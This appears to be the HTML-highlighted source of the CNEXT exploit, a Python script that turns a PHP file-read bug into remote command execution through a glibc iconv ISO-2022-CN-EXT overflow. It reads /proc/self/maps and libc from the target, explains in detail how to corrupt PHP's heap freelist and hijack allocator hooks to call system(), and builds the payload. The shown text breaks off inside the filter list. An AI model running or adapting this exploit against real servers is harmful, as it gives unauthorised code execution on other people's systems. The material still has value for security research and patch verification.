class="line"><span class="comment"># Author: Charles FOL @cfreal_ (LEXFO/AMBIONICS)  </span></span><br><span class="line"><span class="comment">#  </span></span><br><span class="line"><span class="comment"># TODO Parse LIBC to know if patched  </span></span><br><span class="line"><span class="comment">#  </span></span><br><span class="line"><span class="comment"># INFORMATIONS  </span></span><br><span class="line"><span class="comment">#  </span></span><br><span class="line"><span class="comment"># To use, implement the Remote class, which tells the exploit how to send the payload.  </span></span><br><span class="line"><span class="comment">#  </span></span><br><span class="line">  </span><br><span class="line"><span class="keyword">from</span> __future__ <span class="keyword">import</span> annotations  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> base64  </span><br><span class="line"><span class="keyword">import</span> zlib  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">from</span> dataclasses <span class="keyword">import</span> dataclass  </span><br><span class="line"><span class="keyword">from</span> requests.exceptions <span class="keyword">import</span> ConnectionError, ChunkedEncodingError  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *  </span><br><span class="line"><span class="keyword">from</span> ten <span class="keyword">import</span> *  </span><br><span class="line">  </span><br><span class="line">HEAP_SIZE = <span class="number">2</span> * <span class="number">1024</span> * <span class="number">1024</span>  </span><br><span class="line">BUG = <span class="string">&quot;劄&quot;</span>.encode(<span class="string">&quot;utf-8&quot;</span>)  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Remote</span>:  </span><br><span class="line">    <span class="string">&quot;&quot;&quot;A helper class to send the payload and download files.  </span></span><br><span class="line"><span class="string">  </span></span><br><span class="line"><span class="string">    The logic of the exploit is always the same, but the exploit needs to know how to    download files (/proc/self/maps and libc) and how to send the payload.  </span></span><br><span class="line"><span class="string">    The code here serves as an example that attacks a page that looks like:  </span></span><br><span class="line"><span class="string">    ```php    &lt;?php  </span></span><br><span class="line"><span class="string">    $data = file_get_contents($_POST[&#x27;file&#x27;]);    echo &quot;File contents: $data&quot;;    ```  </span></span><br><span class="line"><span class="string">    Tweak it to fit your target, and start the exploit.    &quot;&quot;&quot;</span>  </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, url: <span class="built_in">str</span></span>) -&gt; <span class="literal">None</span>:  </span><br><span class="line">        self.url = url  </span><br><span class="line">        self.session = Session()  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">send</span>(<span class="params">self, path: <span class="built_in">str</span></span>) -&gt; Response:  </span><br><span class="line">        <span class="string">&quot;&quot;&quot;Sends given `path` to the HTTP server. Returns the response.  </span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span>        <span class="keyword">return</span> self.session.post(self.url + <span class="string">&quot;/?exp=1&quot;</span>, data=&#123;<span class="string">&quot;filetoread&quot;</span>: path&#125;)  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">download</span>(<span class="params">self, path: <span class="built_in">str</span></span>) -&gt; <span class="built_in">bytes</span>:  </span><br><span class="line">        <span class="string">&quot;&quot;&quot;Returns the contents of a remote file.  </span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span>        path = <span class="string">f&quot;php://filter/convert.base64-encode/resource=<span class="subst">&#123;path&#125;</span>&quot;</span>  </span><br><span class="line">        response = self.send(path)  </span><br><span class="line">        data = response.re.search(<span class="string">b&quot;File Contents:(.*)&quot;</span>, flags=re.S).group(<span class="number">1</span>)  </span><br><span class="line">        <span class="keyword">return</span> base64.decode(data)  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"><span class="meta">@entry  </span></span><br><span class="line"><span class="meta">@arg(<span class="params"><span class="string">&quot;url&quot;</span>, <span class="string">&quot;Target URL&quot;</span></span>)  </span></span><br><span class="line"><span class="meta">@arg(<span class="params"><span class="string">&quot;command&quot;</span>, <span class="string">&quot;Command to run on the system; limited to 0x140 bytes&quot;</span></span>)  </span></span><br><span class="line"><span class="meta">@arg(<span class="params"><span class="string">&quot;sleep&quot;</span>, <span class="string">&quot;Time to sleep to assert that the exploit worked. By default, 1.&quot;</span></span>)  </span></span><br><span class="line"><span class="meta">@arg(<span class="params"><span class="string">&quot;heap&quot;</span>, <span class="string">&quot;Address of the main zend_mm_heap structure.&quot;</span></span>)  </span></span><br><span class="line"><span class="meta">@arg(<span class="params">  </span></span></span><br><span class="line"><span class="params"><span class="meta">    <span class="string">&quot;pad&quot;</span>,  </span></span></span><br><span class="line"><span class="params"><span class="meta">    <span class="string">&quot;Number of 0x100 chunks to pad with. If the website makes a lot of heap &quot;</span>  </span></span></span><br><span class="line"><span class="params"><span class="meta">    <span class="string">&quot;operations with this size, increase this. Defaults to 20.&quot;</span>,  </span></span></span><br><span class="line"><span class="params"><span class="meta"></span>)  </span></span><br><span class="line"><span class="meta">@dataclass  </span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Exploit</span>:  </span><br><span class="line">    <span class="string">&quot;&quot;&quot;CNEXT exploit: RCE using a file read primitive in PHP.&quot;&quot;&quot;</span>  </span><br><span class="line">  </span><br><span class="line">    url: <span class="built_in">str</span>  </span><br><span class="line">    command: <span class="built_in">str</span>  </span><br><span class="line">    sleep: <span class="built_in">int</span> = <span class="number">1</span>  </span><br><span class="line">    heap: <span class="built_in">str</span> = <span class="literal">None</span>  </span><br><span class="line">    pad: <span class="built_in">int</span> = <span class="number">20</span>  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__post_init__</span>(<span class="params">self</span>):  </span><br><span class="line">        self.remote = Remote(self.url)  </span><br><span class="line">        self.log = logger(<span class="string">&quot;EXPLOIT&quot;</span>)  </span><br><span class="line">        self.info = &#123;&#125;  </span><br><span class="line">        self.heap = self.heap <span class="keyword">and</span> <span class="built_in">int</span>(self.heap, <span class="number">16</span>)  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">check_vulnerable</span>(<span class="params">self</span>) -&gt; <span class="literal">None</span>:  </span><br><span class="line">        <span class="string">&quot;&quot;&quot;Checks whether the target is reachable and properly allows for the various  </span></span><br><span class="line"><span class="string">        wrappers and filters that the exploit needs.        &quot;&quot;&quot;</span>  </span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">safe_download</span>(<span class="params">path: <span class="built_in">str</span></span>) -&gt; <span class="built_in">bytes</span>:  </span><br><span class="line">            <span class="keyword">try</span>:  </span><br><span class="line">                <span class="keyword">return</span> self.remote.download(path)  </span><br><span class="line">            <span class="keyword">except</span> ConnectionError:  </span><br><span class="line">                failure(<span class="string">&quot;Target not [b]reachable[/] ?&quot;</span>)  </span><br><span class="line">  </span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">check_token</span>(<span class="params">text: <span class="built_in">str</span>, path: <span class="built_in">str</span></span>) -&gt; <span class="built_in">bool</span>:  </span><br><span class="line">            result = safe_download(path)  </span><br><span class="line">            <span class="keyword">return</span> text.encode() == result  </span><br><span class="line">  </span><br><span class="line">        text = tf.random.string(<span class="number">50</span>).encode()  </span><br><span class="line">        base64 = b64(text, misalign=<span class="literal">True</span>).decode()  </span><br><span class="line">        path = <span class="string">f&quot;data:text/plain;base64,<span class="subst">&#123;base64&#125;</span>&quot;</span>  </span><br><span class="line">  </span><br><span class="line">        result = safe_download(path)  </span><br><span class="line">  </span><br><span class="line">        <span class="keyword">if</span> text <span class="keyword">not</span> <span class="keyword">in</span> result:  </span><br><span class="line">            msg_failure(<span class="string">&quot;Remote.download did not return the test string&quot;</span>)  </span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;--------------------&quot;</span>)  </span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;Expected test string: <span class="subst">&#123;text&#125;</span>&quot;</span>)  </span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;Got: <span class="subst">&#123;result&#125;</span>&quot;</span>)  </span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;--------------------&quot;</span>)  </span><br><span class="line">            failure(<span class="string">&quot;If your code works fine, it means that the [i]data://[/] wrapper does not work&quot;</span>)  </span><br><span class="line">  </span><br><span class="line">        msg_info(<span class="string">&quot;The [i]data://[/] wrapper works&quot;</span>)  </span><br><span class="line">  </span><br><span class="line">        text = tf.random.string(<span class="number">50</span>)  </span><br><span class="line">        base64 = b64(text.encode(), misalign=<span class="literal">True</span>).decode()  </span><br><span class="line">        path = <span class="string">f&quot;php://filter//resource=data:text/plain;base64,<span class="subst">&#123;base64&#125;</span>&quot;</span>  </span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> check_token(text, path):  </span><br><span class="line">            failure(<span class="string">&quot;The [i]php://filter/[/] wrapper does not work&quot;</span>)  </span><br><span class="line">  </span><br><span class="line">        msg_info(<span class="string">&quot;The [i]php://filter/[/] wrapper works&quot;</span>)  </span><br><span class="line">  </span><br><span class="line">        text = tf.random.string(<span class="number">50</span>)  </span><br><span class="line">        base64 = b64(compress(text.encode()), misalign=<span class="literal">True</span>).decode()  </span><br><span class="line">        path = <span class="string">f&quot;php://filter/zlib.inflate/resource=data:text/plain;base64,<span class="subst">&#123;base64&#125;</span>&quot;</span>  </span><br><span class="line">  </span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> check_token(text, path):  </span><br><span class="line">            failure(<span class="string">&quot;The [i]zlib[/] extension is not enabled&quot;</span>)  </span><br><span class="line">  </span><br><span class="line">        msg_info(<span class="string">&quot;The [i]zlib[/] extension is enabled&quot;</span>)  </span><br><span class="line">  </span><br><span class="line">        msg_success(<span class="string">&quot;Exploit preconditions are satisfied&quot;</span>)  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get_file</span>(<span class="params">self, path: <span class="built_in">str</span></span>) -&gt; <span class="built_in">bytes</span>:  </span><br><span class="line">        <span class="keyword">with</span> msg_status(<span class="string">f&quot;Downloading [i]<span class="subst">&#123;path&#125;</span>[/]...&quot;</span>):  </span><br><span class="line">            <span class="keyword">return</span> self.remote.download(path)  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get_regions</span>(<span class="params">self</span>) -&gt; <span class="built_in">list</span>[Region]:  </span><br><span class="line">        <span class="string">&quot;&quot;&quot;Obtains the memory regions of the PHP process by querying /proc/self/maps.&quot;&quot;&quot;</span>  </span><br><span class="line">        maps = self.get_file(<span class="string">&quot;/proc/self/maps&quot;</span>)  </span><br><span class="line">        maps = maps.decode()  </span><br><span class="line">        PATTERN = re.<span class="built_in">compile</span>(  </span><br><span class="line">            <span class="string">r&quot;^([a-f0-9]+)-([a-f0-9]+)\b&quot;</span> <span class="string">r&quot;.*&quot;</span> <span class="string">r&quot;\s([-rwx]&#123;3&#125;[ps])\s&quot;</span> <span class="string">r&quot;(.*)&quot;</span>  </span><br><span class="line">        )  </span><br><span class="line">        regions = []  </span><br><span class="line">        <span class="keyword">for</span> region <span class="keyword">in</span> table.split(maps, strip=<span class="literal">True</span>):  </span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">match</span> := PATTERN.<span class="keyword">match</span>(region):  </span><br><span class="line">                start = <span class="built_in">int</span>(<span class="keyword">match</span>.group(<span class="number">1</span>), <span class="number">16</span>)  </span><br><span class="line">                stop = <span class="built_in">int</span>(<span class="keyword">match</span>.group(<span class="number">2</span>), <span class="number">16</span>)  </span><br><span class="line">                permissions = <span class="keyword">match</span>.group(<span class="number">3</span>)  </span><br><span class="line">                path = <span class="keyword">match</span>.group(<span class="number">4</span>)  </span><br><span class="line">                <span class="keyword">if</span> <span class="string">&quot;/&quot;</span> <span class="keyword">in</span> path <span class="keyword">or</span> <span class="string">&quot;[&quot;</span> <span class="keyword">in</span> path:  </span><br><span class="line">                    path = path.rsplit(<span class="string">&quot; &quot;</span>, <span class="number">1</span>)[-<span class="number">1</span>]  </span><br><span class="line">                <span class="keyword">else</span>:  </span><br><span class="line">                    path = <span class="string">&quot;&quot;</span>  </span><br><span class="line">                current = Region(start, stop, permissions, path)  </span><br><span class="line">                regions.append(current)  </span><br><span class="line">            <span class="keyword">else</span>:  </span><br><span class="line">                <span class="built_in">print</span>(maps)  </span><br><span class="line">                failure(<span class="string">&quot;Unable to parse memory mappings&quot;</span>)  </span><br><span class="line">  </span><br><span class="line">        self.log.info(<span class="string">f&quot;Got <span class="subst">&#123;<span class="built_in">len</span>(regions)&#125;</span> memory regions&quot;</span>)  </span><br><span class="line">  </span><br><span class="line">        <span class="keyword">return</span> regions  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get_symbols_and_addresses</span>(<span class="params">self</span>) -&gt; <span class="literal">None</span>:  </span><br><span class="line">        <span class="string">&quot;&quot;&quot;Obtains useful symbols and addresses from the file read primitive.&quot;&quot;&quot;</span>  </span><br><span class="line">        regions = self.get_regions()  </span><br><span class="line">  </span><br><span class="line">        LIBC_FILE = <span class="string">&quot;/dev/shm/cnext-libc&quot;</span>  </span><br><span class="line">  </span><br><span class="line">        <span class="comment"># PHP&#x27;s heap  </span></span><br><span class="line">  </span><br><span class="line">        self.info[<span class="string">&quot;heap&quot;</span>] = self.heap <span class="keyword">or</span> self.find_main_heap(regions)  </span><br><span class="line">  </span><br><span class="line">        <span class="comment"># Libc  </span></span><br><span class="line">  </span><br><span class="line">        libc = self._get_region(regions, <span class="string">&quot;libc-&quot;</span>, <span class="string">&quot;libc.so&quot;</span>)  </span><br><span class="line">  </span><br><span class="line">        self.download_file(libc.path, LIBC_FILE)  </span><br><span class="line">  </span><br><span class="line">        self.info[<span class="string">&quot;libc&quot;</span>] = ELF(LIBC_FILE, checksec=<span class="literal">False</span>)  </span><br><span class="line">        self.info[<span class="string">&quot;libc&quot;</span>].address = libc.start  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">_get_region</span>(<span class="params">self, regions: <span class="built_in">list</span>[Region], *names: <span class="built_in">str</span></span>) -&gt; Region:  </span><br><span class="line">        <span class="string">&quot;&quot;&quot;Returns the first region whose name matches one of the given names.&quot;&quot;&quot;</span>  </span><br><span class="line">        <span class="keyword">for</span> region <span class="keyword">in</span> regions:  </span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">any</span>(name <span class="keyword">in</span> region.path <span class="keyword">for</span> name <span class="keyword">in</span> names):  </span><br><span class="line">                <span class="keyword">break</span>  </span><br><span class="line">        <span class="keyword">else</span>:  </span><br><span class="line">            failure(<span class="string">&quot;Unable to locate region&quot;</span>)  </span><br><span class="line">  </span><br><span class="line">        <span class="keyword">return</span> region  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">download_file</span>(<span class="params">self, remote_path: <span class="built_in">str</span>, local_path: <span class="built_in">str</span></span>) -&gt; <span class="literal">None</span>:  </span><br><span class="line">        <span class="string">&quot;&quot;&quot;Downloads `remote_path` to `local_path`&quot;&quot;&quot;</span>  </span><br><span class="line">        data = self.get_file(remote_path)  </span><br><span class="line">        Path(local_path).write(data)  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">find_main_heap</span>(<span class="params">self, regions: <span class="built_in">list</span>[Region]</span>) -&gt; Region:  </span><br><span class="line">        <span class="comment"># Any anonymous RW region with a size superior to the base heap size is a  </span></span><br><span class="line">        <span class="comment"># candidate. The heap is at the bottom of the region.        heaps = [  </span></span><br><span class="line">            region.stop - HEAP_SIZE + <span class="number">0x40</span>  </span><br><span class="line">            <span class="keyword">for</span> region <span class="keyword">in</span> <span class="built_in">reversed</span>(regions)  </span><br><span class="line">            <span class="keyword">if</span> region.permissions == <span class="string">&quot;rw-p&quot;</span>  </span><br><span class="line">            <span class="keyword">and</span> region.size &gt;= HEAP_SIZE  </span><br><span class="line">            <span class="keyword">and</span> region.stop &amp; (HEAP_SIZE - <span class="number">1</span>) == <span class="number">0</span>  </span><br><span class="line">            <span class="keyword">and</span> region.path <span class="keyword">in</span> (<span class="string">&quot;&quot;</span>, <span class="string">&quot;[anon:zend_alloc]&quot;</span>)  </span><br><span class="line">        ]  </span><br><span class="line">  </span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> heaps:  </span><br><span class="line">            failure(<span class="string">&quot;Unable to find PHP&#x27;s main heap in memory&quot;</span>)  </span><br><span class="line">  </span><br><span class="line">        first = heaps[<span class="number">0</span>]  </span><br><span class="line">  </span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(heaps) &gt; <span class="number">1</span>:  </span><br><span class="line">            heaps = <span class="string">&quot;, &quot;</span>.join(<span class="built_in">map</span>(<span class="built_in">hex</span>, heaps))  </span><br><span class="line">            msg_info(<span class="string">f&quot;Potential heaps: [i]<span class="subst">&#123;heaps&#125;</span>[/] (using first)&quot;</span>)  </span><br><span class="line">        <span class="keyword">else</span>:  </span><br><span class="line">            msg_info(<span class="string">f&quot;Using [i]<span class="subst">&#123;<span class="built_in">hex</span>(first)&#125;</span>[/] as heap&quot;</span>)  </span><br><span class="line">  </span><br><span class="line">        <span class="keyword">return</span> first  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">run</span>(<span class="params">self</span>) -&gt; <span class="literal">None</span>:  </span><br><span class="line">        self.check_vulnerable()  </span><br><span class="line">        self.get_symbols_and_addresses()  </span><br><span class="line">        self.exploit()  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">build_exploit_path</span>(<span class="params">self</span>) -&gt; <span class="built_in">str</span>:  </span><br><span class="line">        <span class="string">&quot;&quot;&quot;On each step of the exploit, a filter will process each chunk one after the  </span></span><br><span class="line"><span class="string">        other. Processing generally involves making some kind of operation either        on the chunk or in a destination chunk of the same size. Each operation is        applied on every single chunk; you cannot make PHP apply iconv on the first 10        chunks and leave the rest in place. That&#x27;s where the difficulties come from.  </span></span><br><span class="line"><span class="string">        Keep in mind that we know the address of the main heap, and the libraries.        ASLR/PIE do not matter here.  </span></span><br><span class="line"><span class="string">        The idea is to use the bug to make the freelist for chunks of size 0x100 point        lower. For instance, we have the following free list:  </span></span><br><span class="line"><span class="string">        ... -&gt; 0x7fffAABBCC900 -&gt; 0x7fffAABBCCA00 -&gt; 0x7fffAABBCCB00  </span></span><br><span class="line"><span class="string">        By triggering the bug from chunk ..900, we get:  </span></span><br><span class="line"><span class="string">        ... -&gt; 0x7fffAABBCCA00 -&gt; 0x7fffAABBCCB48 -&gt; ???  </span></span><br><span class="line"><span class="string">        That&#x27;s step 3.  </span></span><br><span class="line"><span class="string">        Now, in order to control the free list, and make it point whereever we want,        we need to have previously put a pointer at address 0x7fffAABBCCB48. To do so,        we&#x27;d have to have allocated 0x7fffAABBCCB00 and set our pointer at offset 0x48.        That&#x27;s step 2.  </span></span><br><span class="line"><span class="string">        Now, if we were to perform step2 an then step3 without anything else, we&#x27;d have        a problem: after step2 has been processed, the free list goes bottom-up, like:  </span></span><br><span class="line"><span class="string">        0x7fffAABBCCB00 -&gt; 0x7fffAABBCCA00 -&gt; 0x7fffAABBCC900  </span></span><br><span class="line"><span class="string">        We need to go the other way around. That&#x27;s why we have step 1: it just allocates        chunks. When they get freed, they reverse the free list. Now step2 allocates in        reverse order, and therefore after step2, chunks are in the correct order.  </span></span><br><span class="line"><span class="string">        Another problem comes up.  </span></span><br><span class="line"><span class="string">        To trigger the overflow in step3, we convert from UTF-8 to ISO-2022-CN-EXT.        Since step2 creates chunks that contain pointers and pointers are generally not        UTF-8, we cannot afford to have that conversion happen on the chunks of step2.        To avoid this, we put the chunks in step2 at the very end of the chain, and        prefix them with `0\n`. When dechunked (right before the iconv), they will        &quot;disappear&quot; from the chain, preserving them from the character set conversion        and saving us from an unwanted processing error that would stop the processing        chain.  </span></span><br><span class="line"><span class="string">        After step3 we have a corrupted freelist with an arbitrary pointer into it. We        don&#x27;t know the precise layout of the heap, but we know that at the top of the        heap resides a zend_mm_heap structure. We overwrite this structure in two ways.        Its free_slot[] array contains a pointer to each free list. By overwriting it,        we can make PHP allocate chunks whereever we want. In addition, its custom_heap        field contains pointers to hook functions for emalloc, efree, and erealloc        (similarly to malloc_hook, free_hook, etc. in the libc). We overwrite them and        then overwrite the use_custom_heap flag to make PHP use these function pointers        instead. We can now do our favorite CTF technique and get a call to        system(&lt;chunk&gt;).        We make sure that the &quot;system&quot; command kills the current process to avoid other        system() calls with random chunk data, leading to undefined behaviour.  </span></span><br><span class="line"><span class="string">        The pad blocks just &quot;pad&quot; our allocations so that even if the heap of the        process is in a random state, we still get contiguous, in order chunks for our        exploit.  </span></span><br><span class="line"><span class="string">        Therefore, the whole process described here CANNOT crash. Everything falls        perfectly in place, and nothing can get in the middle of our allocations.        &quot;&quot;&quot;</span>  </span><br><span class="line">        LIBC = self.info[<span class="string">&quot;libc&quot;</span>]  </span><br><span class="line">        ADDR_EMALLOC = LIBC.symbols[<span class="string">&quot;__libc_malloc&quot;</span>]  </span><br><span class="line">        ADDR_EFREE = LIBC.symbols[<span class="string">&quot;__libc_system&quot;</span>]  </span><br><span class="line">        ADDR_EREALLOC = LIBC.symbols[<span class="string">&quot;__libc_realloc&quot;</span>]  </span><br><span class="line">  </span><br><span class="line">        ADDR_HEAP = self.info[<span class="string">&quot;heap&quot;</span>]  </span><br><span class="line">        ADDR_FREE_SLOT = ADDR_HEAP + <span class="number">0x20</span>  </span><br><span class="line">        ADDR_CUSTOM_HEAP = ADDR_HEAP + <span class="number">0x0168</span>  </span><br><span class="line">  </span><br><span class="line">        ADDR_FAKE_BIN = ADDR_FREE_SLOT - <span class="number">0x10</span>  </span><br><span class="line">  </span><br><span class="line">        CS = <span class="number">0x100</span>  </span><br><span class="line">  </span><br><span class="line">        <span class="comment"># Pad needs to stay at size 0x100 at every step  </span></span><br><span class="line">        pad_size = CS - <span class="number">0x18</span>  </span><br><span class="line">        pad = <span class="string">b&quot;\x00&quot;</span> * pad_size  </span><br><span class="line">        pad = chunked_chunk(pad, <span class="built_in">len</span>(pad) + <span class="number">6</span>)  </span><br><span class="line">        pad = chunked_chunk(pad, <span class="built_in">len</span>(pad) + <span class="number">6</span>)  </span><br><span class="line">        pad = chunked_chunk(pad, <span class="built_in">len</span>(pad) + <span class="number">6</span>)  </span><br><span class="line">        pad = compressed_bucket(pad)  </span><br><span class="line">  </span><br><span class="line">        step1_size = <span class="number">1</span>  </span><br><span class="line">        step1 = <span class="string">b&quot;\x00&quot;</span> * step1_size  </span><br><span class="line">        step1 = chunked_chunk(step1)  </span><br><span class="line">        step1 = chunked_chunk(step1)  </span><br><span class="line">        step1 = chunked_chunk(step1, CS)  </span><br><span class="line">        step1 = compressed_bucket(step1)  </span><br><span class="line">  </span><br><span class="line">        <span class="comment"># Since these chunks contain non-UTF-8 chars, we cannot let it get converted to  </span></span><br><span class="line">        <span class="comment"># ISO-2022-CN-EXT. We add a `0\n` that makes the 4th and last dechunk &quot;crash&quot;  </span></span><br><span class="line">        step2_size = <span class="number">0x48</span>  </span><br><span class="line">        step2 = <span class="string">b&quot;\x00&quot;</span> * (step2_size + <span class="number">8</span>)  </span><br><span class="line">        step2 = chunked_chunk(step2, CS)  </span><br><span class="line">        step2 = chunked_chunk(step2)  </span><br><span class="line">        step2 = compressed_bucket(step2)  </span><br><span class="line">  </span><br><span class="line">        step2_write_ptr = <span class="string">b&quot;0\n&quot;</span>.ljust(step2_size, <span class="string">b&quot;\x00&quot;</span>) + p64(ADDR_FAKE_BIN)  </span><br><span class="line">        step2_write_ptr = chunked_chunk(step2_write_ptr, CS)  </span><br><span class="line">        step2_write_ptr = chunked_chunk(step2_write_ptr)  </span><br><span class="line">        step2_write_ptr = compressed_bucket(step2_write_ptr)  </span><br><span class="line">  </span><br><span class="line">        step3_size = CS  </span><br><span class="line">  </span><br><span class="line">        step3 = <span class="string">b&quot;\x00&quot;</span> * step3_size  </span><br><span class="line">        <span class="keyword">assert</span> <span class="built_in">len</span>(step3) == CS  </span><br><span class="line">        step3 = chunked_chunk(step3)  </span><br><span class="line">        step3 = chunked_chunk(step3)  </span><br><span class="line">        step3 = chunked_chunk(step3)  </span><br><span class="line">        step3 = compressed_bucket(step3)  </span><br><span class="line">  </span><br><span class="line">        step3_overflow = <span class="string">b&quot;\x00&quot;</span> * (step3_size - <span class="built_in">len</span>(BUG)) + BUG  </span><br><span class="line">        <span class="keyword">assert</span> <span class="built_in">len</span>(step3_overflow) == CS  </span><br><span class="line">        step3_overflow = chunked_chunk(step3_overflow)  </span><br><span class="line">        step3_overflow = chunked_chunk(step3_overflow)  </span><br><span class="line">        step3_overflow = chunked_chunk(step3_overflow)  </span><br><span class="line">        step3_overflow = compressed_bucket(step3_overflow)  </span><br><span class="line">  </span><br><span class="line">        step4_size = CS  </span><br><span class="line">        step4 = <span class="string">b&quot;=00&quot;</span> + <span class="string">b&quot;\x00&quot;</span> * (step4_size - <span class="number">1</span>)  </span><br><span class="line">        step4 = chunked_chunk(step4)  </span><br><span class="line">        step4 = chunked_chunk(step4)  </span><br><span class="line">        step4 = chunked_chunk(step4)  </span><br><span class="line">        step4 = compressed_bucket(step4)  </span><br><span class="line">  </span><br><span class="line">        <span class="comment"># This chunk will eventually overwrite mm_heap-&gt;free_slot  </span></span><br><span class="line">        <span class="comment"># it is actually allocated 0x10 bytes BEFORE it, thus the two filler values        step4_pwn = ptr_bucket(  </span></span><br><span class="line">            <span class="number">0x200000</span>,  </span><br><span class="line">            <span class="number">0</span>,  </span><br><span class="line">            <span class="comment"># free_slot  </span></span><br><span class="line">            <span class="number">0</span>,  </span><br><span class="line">            <span class="number">0</span>,  </span><br><span class="line">            ADDR_CUSTOM_HEAP,  <span class="comment"># 0x18  </span></span><br><span class="line">            <span class="number">0</span>,  </span><br><span class="line">            <span class="number">0</span>,  </span><br><span class="line">            <span class="number">0</span>,  </span><br><span class="line">            <span class="number">0</span>,  </span><br><span class="line">            <span class="number">0</span>,  </span><br><span class="line">            <span class="number">0</span>,  </span><br><span class="line">            <span class="number">0</span>,  </span><br><span class="line">            <span class="number">0</span>,  </span><br><span class="line">            <span class="number">0</span>,  </span><br><span class="line">            <span class="number">0</span>,  </span><br><span class="line">            <span class="number">0</span>,  </span><br><span class="line">            <span class="number">0</span>,  </span><br><span class="line">            <span class="number">0</span>,  </span><br><span class="line">            ADDR_HEAP,  <span class="comment"># 0x140  </span></span><br><span class="line">            <span class="number">0</span>,  </span><br><span class="line">            <span class="number">0</span>,  </span><br><span class="line">            <span class="number">0</span>,  </span><br><span class="line">            <span class="number">0</span>,  </span><br><span class="line">            <span class="number">0</span>,  </span><br><span class="line">            <span class="number">0</span>,  </span><br><span class="line">            <span class="number">0</span>,  </span><br><span class="line">            <span class="number">0</span>,  </span><br><span class="line">            <span class="number">0</span>,  </span><br><span class="line">            <span class="number">0</span>,  </span><br><span class="line">            <span class="number">0</span>,  </span><br><span class="line">            <span class="number">0</span>,  </span><br><span class="line">            <span class="number">0</span>,  </span><br><span class="line">            size=CS,  </span><br><span class="line">        )  </span><br><span class="line">  </span><br><span class="line">        step4_custom_heap = ptr_bucket(  </span><br><span class="line">            ADDR_EMALLOC, ADDR_EFREE, ADDR_EREALLOC, size=<span class="number">0x18</span>  </span><br><span class="line">        )  </span><br><span class="line">  </span><br><span class="line">        step4_use_custom_heap_size = <span class="number">0x140</span>  </span><br><span class="line">  </span><br><span class="line">        COMMAND = self.command  </span><br><span class="line">        COMMAND = <span class="string">f&quot;kill -9 $PPID; <span class="subst">&#123;COMMAND&#125;</span>&quot;</span>  </span><br><span class="line">        <span class="keyword">if</span> self.sleep:  </span><br><span class="line">            COMMAND = <span class="string">f&quot;sleep <span class="subst">&#123;self.sleep&#125;</span>; <span class="subst">&#123;COMMAND&#125;</span>&quot;</span>  </span><br><span class="line">        COMMAND = COMMAND.encode() + <span class="string">b&quot;\x00&quot;</span>  </span><br><span class="line">  </span><br><span class="line">        <span class="keyword">assert</span> (  </span><br><span class="line">                <span class="built_in">len</span>(COMMAND) &lt;= step4_use_custom_heap_size  </span><br><span class="line">        ), <span class="string">f&quot;Command too big (<span class="subst">&#123;<span class="built_in">len</span>(COMMAND)&#125;</span>), it must be strictly inferior to <span class="subst">&#123;<span class="built_in">hex</span>(step4_use_custom_heap_size)&#125;</span>&quot;</span>  </span><br><span class="line">        COMMAND = COMMAND.ljust(step4_use_custom_heap_size, <span class="string">b&quot;\x00&quot;</span>)  </span><br><span class="line">  </span><br><span class="line">        step4_use_custom_heap = COMMAND  </span><br><span class="line">        step4_use_custom_heap = qpe(step4_use_custom_heap)  </span><br><span class="line">        step4_use_custom_heap = chunked_chunk(step4_use_custom_heap)  </span><br><span class="line">        step4_use_custom_heap = chunked_chunk(step4_use_custom_heap)  </span><br><span class="line">        step4_use_custom_heap = chunked_chunk(step4_use_custom_heap)  </span><br><span class="line">        step4_use_custom_heap = compressed_bucket(step4_use_custom_heap)  </span><br><span class="line">  </span><br><span class="line">        pages = (  </span><br><span class="line">                step4 * <span class="number">3</span>  </span><br><span class="line">                + step4_pwn  </span><br><span class="line">                + step4_custom_heap  </span><br><span class="line">                + step4_use_custom_heap  </span><br><span class="line">                + step3_overflow  </span><br><span class="line">                + pad * self.pad  </span><br><span class="line">                + step1 * <span class="number">3</span>  </span><br><span class="line">                + step2_write_ptr  </span><br><span class="line">                + step2 * <span class="number">2</span>  </span><br><span class="line">        )  </span><br><span class="line">  </span><br><span class="line">        resource = compress(compress(pages))  </span><br><span class="line">        resource = b64(resource)  </span><br><span class="line">        resource = <span class="string">f&quot;data:text/plain;base64,<span class="subst">&#123;resource.decode()&#125;</span>&quot;</span>  </span><br><span class="line">  </span><br><span class="line">        filters = [  </span><br><span class="line">            <span class="comment"># Create buckets  </span></span><br><span class="line">            <span class="string">&quot;zlib.inflate&quot;</span>,  